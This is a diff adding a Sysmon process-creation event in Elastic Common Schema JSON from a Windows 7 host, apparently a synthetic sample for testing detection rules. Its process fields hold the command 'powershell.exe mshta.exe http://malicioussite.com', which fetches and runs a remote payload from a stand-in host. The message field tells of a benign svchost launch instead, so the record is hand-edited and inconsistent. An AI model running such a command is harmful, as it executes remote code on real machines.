@@ -1,0 +1,136 @@
+{
+  "@timestamp": "2021-02-04T22:28:57.093Z",
+  "host": {
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.101",
+      "172.16.1.1",
+      "fe80::5efe:c0a8:3865",
+      "fe80::5efe:ac10:101"
+    ],
+    "mac": [
+      "00:50:56:00:03:01",
+      "00:50:56:00:00:01",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT1",
+    "name": "CLIENT1.breach.local",
+    "architecture": "x86",
+    "os": {
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0"
+    }
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "log": {
+    "level": "information"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:28:57.093\nProcessGuid: {19FC45AC-7529-601C-0000-0010A9ED0000}\nProcessId: 1000\nImage: C:\\Windows\\System32\\svchost.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Host Process for Windows Services\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: svchost.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\LOCAL SERVICE\nLogonGuid: {19FC45AC-7528-601C-0000-0020E5030000}\nLogonId: 0x3e5\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=54A47F6B5E09A77E61649109C6A08866,SHA256=121118A0F5E0E8C933EFD28C9901E54E42792619A8A3A6D11E1F0025A7324BC2\nParentProcessGuid: {19FC45AC-7527-601C-0000-00104B610000}\nParentProcessId: 444\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "process": {
+    "executable": "C:\\Windows\\System32\\PowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe mshta.exe http://malicioussite.com",
+    "args": [
+      "powershell.exe",
+      "mshta.exe",
+      "http://malicioussite.com"
+    ],
+    "hash": {
+      "md5": "54a47f6b5e09a77e61649109c6a08866",
+      "sha256": "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2"
+    },
+    "pid": 1000,
+    "working_directory": "C:\\Windows\\system32\\",
+    "parent": {
+      "entity_id": "{19FC45AC-7527-601C-0000-00104B610000}",
+      "pid": 444,
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ]
+    },
+    "name": "powershell.exe",
+    "entity_id": "{19FC45AC-7529-601C-0000-0010A9ED0000}"
+  },
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "LOCAL SERVICE"
+  },
+  "related": {
+    "user": "LOCAL SERVICE",
+    "hash": [
+      "54a47f6b5e09a77e61649109c6a08866",
+      "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2"
+    ]
+  },
+  "hash": {
+    "sha256": "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2",
+    "md5": "54a47f6b5e09a77e61649109c6a08866"
+  },
+  "winlog": {
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "event_data": {
+      "LogonGuid": "{19FC45AC-7528-601C-0000-0020E5030000}",
+      "TerminalSessionId": "0",
+      "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+      "IntegrityLevel": "System",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "OriginalFileName": "svchost.exe",
+      "Company": "Microsoft Corporation",
+      "Description": "Host Process for Windows Services",
+      "LogonId": "0x3e5"
+    },
+    "event_id": 1,
+    "opcode": "Info",
+    "process": {
+      "pid": 1524,
+      "thread": {
+        "id": 1792
+      }
+    },
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "record_id": 1275,
+    "computer_name": "CLIENT1.breach.local",
+    "version": 5,
+    "task": "Process Create (rule: ProcessCreate)",
+    "api": "wineventlog",
+    "user": {
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18"
+    }
+  },
+  "event": {
+    "category": [
+      "process"
+    ],
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:06.297Z",
+    "kind": "event",
+    "module": "sysmon",
+    "type": [
+      "start",
+      "process_start"
+    ]
+  },
+  "agent": {
+    "ephemeral_id": "c6dab1c1-2860-4ed8-b41c-e6b57498568e",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT1",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT1"
+  }
+}
